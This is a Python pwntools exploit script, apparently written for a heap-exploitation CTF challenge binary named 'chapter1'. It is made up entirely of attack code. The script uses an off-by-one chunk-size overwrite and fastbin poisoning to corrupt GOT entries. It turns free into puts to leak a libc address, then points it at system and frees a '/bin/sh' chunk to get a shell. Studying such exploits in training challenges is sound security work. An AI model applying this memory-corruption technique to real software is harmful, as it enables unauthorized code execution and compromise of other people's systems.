from pwn import *

p = process('chapter1')

def send(a,b=':'):
    p.sendlineafter(b,str(a))

def send2(a,b=':'):
    p.sendafter(b,str(a))

def create(size,data):
    send(1,'>>')
    send(size)
    send(data)

def edit(index,data):
    send(2,'>>')
    send(index)
    send(data)

def delete(index):
    send(3,'>>')
    send(index)

create(0x68,'a'*0x68)
create(0x68,'b'*24)
create(0x68,'c'*24)
create(0x68,'d'*24)
create(0x68,'/bin/sh\x00barrier')

edit(0,'a'*0x68 + '\xe1')

delete(2)
delete(1)

addr = 0x60209d
create(0xd8,'z'*0x68 + p64(0x71) + p64(addr))

create(0x68,'a'*24)

free_got = 0x602018
puts_plt = 0x4006E0
create(0x68,'a'*19 + p64(free_got)+p64(free_got+8)+p64(free_got+16))

edit(0,p64(puts_plt)[:6])

delete(1)
leak = p.readuntil('\n')[1:-1]

leak = u64(leak.ljust(8,'\x00'))

print hex(leak)
libc = leak-0x06f690
system = libc+0x045390

print hex(system),hex(libc)

edit(2,p64(system)[:6])




gdb.attach(p)
p.interactive()
